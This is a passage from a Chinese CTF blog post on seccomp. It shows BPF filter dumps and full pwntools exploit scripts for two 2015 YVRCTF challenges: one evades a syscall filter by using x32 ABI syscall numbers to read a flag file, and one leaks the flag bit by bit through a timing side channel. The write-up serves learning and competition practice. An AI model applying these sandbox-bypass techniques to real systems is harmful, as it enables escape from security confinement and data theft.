<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump &quot;./dec.pwn 4091897731&quot; </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x19 0xc000003e  if (A != ARCH_X86_64) goto 0027</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x17 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0027</span><br><span class="line"> 0004: 0x15 0x15 0x00 0x00000000  if (A == read) goto 0026</span><br><span class="line"> 0005: 0x15 0x14 0x00 0x00000002  if (A == open) goto 0026</span><br><span class="line"> 0006: 0x15 0x13 0x00 0x00000003  if (A == close) goto 0026</span><br><span class="line"> 0007: 0x15 0x12 0x00 0x00000005  if (A == fstat) goto 0026</span><br><span class="line"> 0008: 0x15 0x11 0x00 0x0000000c  if (A == brk) goto 0026</span><br><span class="line"> 0009: 0x15 0x10 0x00 0x0000000f  if (A == rt_sigreturn) goto 0026</span><br><span class="line"> 0010: 0x15 0x0f 0x00 0x0000003c  if (A == exit) goto 0026</span><br><span class="line"> 0011: 0x15 0x0e 0x00 0x000000e7  if (A == exit_group) goto 0026</span><br><span class="line"> 0012: 0x15 0x00 0x0e 0x00000001  if (A != write) goto 0027</span><br><span class="line"> 0013: 0x20 0x00 0x00 0x00000014  A = args[0] &gt;&gt; 32</span><br><span class="line"> 0014: 0x15 0x00 0x0c 0x00000000  if (A != 0x0) goto 0027</span><br><span class="line"> 0015: 0x20 0x00 0x00 0x00000010  A = args[0]</span><br><span class="line"> 0016: 0x15 0x09 0x00 0x00000002  if (A == 0x2) goto 0026</span><br><span class="line"> 0017: 0x15 0x00 0x09 0x00000001  if (A != 0x1) goto 0027</span><br><span class="line"> 0018: 0x20 0x00 0x00 0x0000001c  A = args[1] &gt;&gt; 32</span><br><span class="line"> 0019: 0x15 0x00 0x07 0x00000000  if (A != 0x0) goto 0027</span><br><span class="line"> 0020: 0x20 0x00 0x00 0x00000018  A = args[1]</span><br><span class="line"> 0021: 0x15 0x00 0x05 0x00602100  if (A != 0x602100) goto 0027</span><br><span class="line"> 0022: 0x20 0x00 0x00 0x00000024  A = args[2] &gt;&gt; 32</span><br><span class="line"> 0023: 0x35 0x00 0x02 0x00000000  if (A &lt; 0x0) goto 0026</span><br><span class="line"> 0024: 0x20 0x00 0x00 0x00000020  A = args[2]</span><br><span class="line"> 0025: 0x25 0x01 0x00 0x00000080  if (A &gt; 0x80) goto 0027</span><br><span class="line"> 0026: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0027: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
<p>这下就清楚了,允许read,open,close,fstat,brk,rt_sigreturn,exit,exit_group</p>
<p>其中write是有参数限制的,不满足条件就kill,而条件是第一个参数只能为1或2,第二个参数只能为0x602100,第三个参数的高4位小于0x80.</p>
<h2 id="Some-challenge"><a href="#Some-challenge" class="headerlink" title="Some challenge"></a>Some challenge</h2><p>在学习的过程中,我还找到了一些以seccomp为主体的题目,不得不佩服</p>
<ul>
<li><strong>2015 baby playpen fence</strong></li>
</ul>
<p>Link: <a href="https://github.com/yvrctf/2015/blob/master/babyplaypenfence/README.md" target="_blank" rel="noopener">https://github.com/yvrctf/2015/blob/master/babyplaypenfence/README.md</a></p>
<p>首先用ida看了一遍,构造合理的输入,触发<code>prctl_seccomp</code>得到保护信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ sudo seccomp-tools dump -c &quot;./babypf &lt; stdin&quot;</span><br><span class="line"></span><br><span class="line">   ______</span><br><span class="line">  | |__| |  WELCOME TO THE</span><br><span class="line">  |  ()  |  UNTRUSTED COMPUTING SERVICE</span><br><span class="line">  |______|  V0.0.1a</span><br><span class="line"></span><br><span class="line">LOAD PROGRAM</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00050016  return ERRNO(22)</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00050016  return ERRNO(22)</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00050016  return ERRNO(22)</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000130  if (A != open_by_handle_at) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00050016  return ERRNO(22)</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00050016  return ERRNO(22)</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>
<p>只禁用了open,mmap,openat, open_by_handle_at和ptrace</p>
<p>第一反应:那为啥不直接用execve???</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python exp.py                                </span><br><span class="line">[+] Starting local process &apos;./babypf&apos;: pid 23036</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &apos;./babypf&apos; stopped with exit code 0 (pid 23036)</span><br><span class="line">sh: error while loading shared libraries: libc.so.6: cannot open shared object file: Invalid argument</span><br><span class="line">THANK YOU</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>果然是我太年轻了</p>
<p>wp上说Since 3.4 the Linux kernel has had a feature called the X32 ABI; 64bit syscalls with 32bit pointers.</p>
<p>看了一下<code>/usr/include/x86_64-linux-gnu/asm/unistd_x32.h</code></p>
<p>内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#ifndef _ASM_X86_UNISTD_X32_H</span><br><span class="line">#define _ASM_X86_UNISTD_X32_H 1</span><br><span class="line"></span><br><span class="line">#define __NR_read (__X32_SYSCALL_BIT + 0)</span><br><span class="line">#define __NR_write (__X32_SYSCALL_BIT + 1)</span><br><span class="line">#define __NR_open (__X32_SYSCALL_BIT + 2)</span><br><span class="line">#define __NR_close (__X32_SYSCALL_BIT + 3)</span><br><span class="line">#define __NR_stat (__X32_SYSCALL_BIT + 4)</span><br><span class="line">#define __NR_fstat (__X32_SYSCALL_BIT + 5)</span><br><span class="line">#define __NR_lstat (__X32_SYSCALL_BIT + 6)</span><br><span class="line">#define __NR_poll (__X32_SYSCALL_BIT + 7)</span><br><span class="line">#define __NR_lseek (__X32_SYSCALL_BIT + 8)</span><br><span class="line">#define __NR_mmap (__X32_SYSCALL_BIT + 9)</span><br><span class="line">#define __NR_mprotect (__X32_SYSCALL_BIT + 10)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>而<code>__X32_SYSCALL_BIT</code>为<code>0x40000000</code></p>
<p>构造shellcode读出flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">	cn = process(&apos;./babypf&apos;)</span><br><span class="line">	bin = ELF(&apos;./babypf&apos;,checksec=False)</span><br><span class="line">	#libc = ELF(&apos;&apos;,checksec=False)</span><br><span class="line">else:</span><br><span class="line">	#cn = remote(&apos;&apos;)</span><br><span class="line">	pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def z(a=&apos;&apos;):</span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	if a == &apos;&apos;:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cn.recvuntil(&apos;LOAD PROGRAM\n&apos;)</span><br><span class="line"></span><br><span class="line">sc = &apos;&apos;&apos;</span><br><span class="line">    push 0x1010101 ^ 0x7478</span><br><span class="line">    xor dword ptr [rsp], 0x1010101</span><br><span class="line">    mov rax, 0x742e67616c662f2e</span><br><span class="line">    push rax</span><br><span class="line">	mov rdi, rsp</span><br><span class="line">	xor edx, edx /* 0 */</span><br><span class="line">	xor esi, esi /* 0 */</span><br><span class="line">	mov rax,0x40000002</span><br><span class="line">	syscall</span><br><span class="line"></span><br><span class="line">	mov rdi, rax</span><br><span class="line">	sub rsp, 0x1000</span><br><span class="line">	lea rsi, [rsp]</span><br><span class="line">	mov rdx, 0x1000</span><br><span class="line">	mov rax, 0x40000000</span><br><span class="line">	syscall</span><br><span class="line"></span><br><span class="line">	mov rdi, 1</span><br><span class="line">	mov rdx, rax</span><br><span class="line">	mov rax, 0x40000001</span><br><span class="line">	syscall</span><br><span class="line"></span><br><span class="line">	mov rax, 0x4000003c</span><br><span class="line">	xor rdi, rdi</span><br><span class="line">	syscall</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">sc = asm(sc)</span><br><span class="line">cn.send(p32(len(sc)))</span><br><span class="line">sleep(0.2)</span><br><span class="line">cn.send(sc)</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>2015 big prison fence</strong></li>
</ul>
<p>Link: <a href="https://github.com/yvrctf/2015/blob/master/bigprisonfence/README.md" target="_blank" rel="noopener">https://github.com/yvrctf/2015/blob/master/bigprisonfence/README.md</a></p>
<p>这次程序的保护为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);</span><br><span class="line">prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);</span><br><span class="line">prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT, 0, 0, 0);</span><br></pre></td></tr></table></figure>
<p>第一个似乎会使我们gdb调试崩溃<br>第三个限制我们只能使用read, write, _exit(but not exit_group), sigreturn.</p>
<p>但由于程序一开始就把flag读进程序了,因此我们只要想办法把他leak出来就行</p>
<p>可惜程序关闭了0~1024的fd,因此考虑写延时shellcode,1bit 1bit来leak.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bf</span><span class="params">(nbyte,nbit)</span>:</span></span><br><span class="line">	cn = process(<span class="string">'./bigpf_y'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#z('b*0x56555ECB\nc')</span></span><br><span class="line">	cn.recvuntil(<span class="string">'NAME PROGRAM\n'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'asdfasdfasdf'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'LOAD PROGRAM\n'</span>)</span><br><span class="line">	sc = <span class="string">'''</span></span><br><span class="line"><span class="string">		/*edi -&gt; flag*/</span></span><br><span class="line"><span class="string">		add edi,%d /* n byte */</span></span><br><span class="line"><span class="string">		xor edx,edx</span></span><br><span class="line"><span class="string">		mov dl,byte ptr [edi]</span></span><br><span class="line"><span class="string">		shr dl,%d /* n bit */</span></span><br><span class="line"><span class="string">		and dl,1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		test edx,edx</span></span><br><span class="line"><span class="string">		jz loop</span></span><br><span class="line"><span class="string">		xor ebx,ebx</span></span><br><span class="line"><span class="string">		mov eax,1</span></span><br><span class="line"><span class="string">		int 0x80 /* exit */</span></span><br><span class="line"><span class="string">	loop:</span></span><br><span class="line"><span class="string">		jmp loop</span></span><br><span class="line"><span class="string">	'''</span> %(nbyte,nbit)</span><br><span class="line">	sc = asm(sc)</span><br><span class="line"></span><br><span class="line">	cn.send(p32(len(sc)))</span><br><span class="line">	cn.send(sc)</span><br><span class="line">	sleep(<span class="number">0.01</span>)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		cn.send(<span class="string">'test'</span>)</span><br><span class="line">		cn.recv(timeout=<span class="number">0.01</span>)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		cn.close()</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	cn.close()</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">out=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>): <span class="comment"># byte</span></span><br><span class="line">	ch=<span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">		ch = str(bf(i,j))+ch</span><br><span class="line">		success(ch)</span><br><span class="line">	intt=int(ch,<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">if</span>(intt == <span class="number">0</span>):</span><br><span class="line">		success(out)</span><br><span class="line">		exit(<span class="number">0</span>)</span><br><span class="line">	out+=chr(intt)</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>HITCON 2017 Seccomp</strong></li>
</ul>
<p>见其他大佬的wp</p>
<p><a href="https://blukat29.github.io/2017/11/hitcon-quals-2017-seccomp/" target="_blank" rel="noopener">https://blukat29.github.io/2017/11/hitcon-quals-2017-seccomp/</a></p>
<blockquote>
<p>The BPF instructions operate on the BPF virtual machine, which has four main elements: The accumulator register A, the index register X, the packet memory, and the scratch memory M[].</p>
</blockquote>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li><a href="http://www.outflux.net/teach-seccomp/" target="_blank" rel="noopener">http://www.outflux.net/teach-seccomp/</a></li>
<li><a href="http://www.outflux.net/teach-seccomp/autodetect.html" target="_blank" rel="noopener">http://www.outflux.net/teach-seccomp/autodetect.html</a></li>
<li><a href="https://eigenstate.org/notes/seccomp" target="_blank" rel="noopener">https://eigenstate.org/notes/seccomp</a></li>
<li><a href="https://dangokyo.me/2018/05/01/seccomp-and-ptrace/" target="_blank" rel="noopener">https://dangokyo.me/2018/05/01/seccomp-and-ptrace/</a></li>
<li><a href="http://manpages.ubuntu.com/manpages/xenial/en/man2/prctl.2.html" target="_blank" rel="noopener">http://manpages.ubuntu.com/manpages/xenial/en/man2/prctl.2.html</a></li>
<li><a href="http://manpages.ubuntu.com/manpages/xenial/en/man2/seccomp.2.html" target="_blank" rel="noopener">http://manpages.ubuntu.com/manpages/xenial/en/man2/seccomp.2.html</a></li>
<li><a href="http://manpages.ubuntu.com/manpages/xenial/en/man3/seccomp_rule_add.3.html" target="_blank" rel="noopener">http://manpages.ubuntu.com/manpages/xenial/en/man3/seccomp_rule_add.3.html</a></li>
<li><a href="http://manpages.ubuntu.com/manpages/xenial/en/man3/seccomp_load.3.html" target="_blank" rel="noopener">http://manpages.ubuntu.com/manpages/xenial/en/man3/seccomp_load.3.html</a></li>
<li><a href="http://manpages.ubuntu.com/manpages/xenial/en/man3/seccomp_export_bpf.3.html" target="_blank" rel="noopener">http://manpages.ubuntu.com/manpages/xenial/en/man3/seccomp_export_bpf.3.html</a></li>
<li><a href="https://www.wikiwand.com/en/Seccomp" target="_blank" rel="noopener">https://www.wikiwand.com/en/Seccomp</a></li>
<li><a href="https://www.kernel.org/doc/Documentation/prctl/no_new_privs.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/prctl/no_new_privs.txt</a></li>
<li><a href="https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt</a></li>
</ul>

      
    </div>

    

    
    
    

    

    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>Post author:  </strong>Veritas501</li>
  <li class="post-copyright-link">
    <strong>Post link: </strong>
    <a href="https://veritas501.github.io/2018/05/05/seccomp学习笔记/" title="seccomp学习笔记">https://veritas501.github.io/2018/05/05/seccomp学习笔记/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/PWN/" rel="tag"># PWN</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/04/11/Largebin 学习/" rel="next" title="Largebin 学习">
                <i class="fa fa-chevron-left"></i> Largebin 学习
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/05/21/Celeste_EastEgg/" rel="prev" title="Celeste EastEgg">
                Celeste EastEgg <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/215.png"
                alt="Veritas501" />
            
              <p class="site-author-name" itemprop="name">Veritas501</p>
              <p class="site-description motion-element" itemprop="description">开始踏上Re&Pwn之路...</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">64</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">38</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  <a href="https://github.com/veritas501" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
                  
                </span>
              
                <span class="links-of-author-item">
                  <a href="http://music.163.com/#/user/home?id=58295006" target="_blank" title="网易云"><i class="fa fa-fw fa-music"></i>网易云</a>
                  
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://www.zhihu.com/people/xu-qt/activities" target="_blank" title="知乎"><i class="fa fa-fw fa-quora"></i>知乎</a>
                  
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://osu.ppy.sh/users/9533614" target="_blank" title="OSU"><i class="fa fa-fw fa-headphones"></i>OSU</a>
                  
                </span>
              
            </div>
          

          
          

          
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#What-is-seccomp"><span class="nav-number">1.</span> <span class="nav-text">What is seccomp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#How-to-use"><span class="nav-number">2.</span> <span class="nav-text">How to use</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#How-to-reverse"><span class="nav-number">3.</span> <span class="nav-text">How to reverse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Some-challenge"><span class="nav-number">4.</span> <span class="nav-text">Some challenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
  <span class="with-love" id="animate">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Veritas501</span>

  

  
</div>




  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>




        








        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  



  





  








  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  
  
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(function (item) {
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'zUGXRoho5JEFbk0lDKssrDi6-gzGzoHsz',
        appKey: 'IE9Knp7ku8I57kP5vFnPO2zA',
        placeholder: '说点什么...',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("97qzbH6lJuabRg1KDY7DtJRS-gzGzoHsz", "GS8vVhMCaeXncQF8mQOIShBj");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
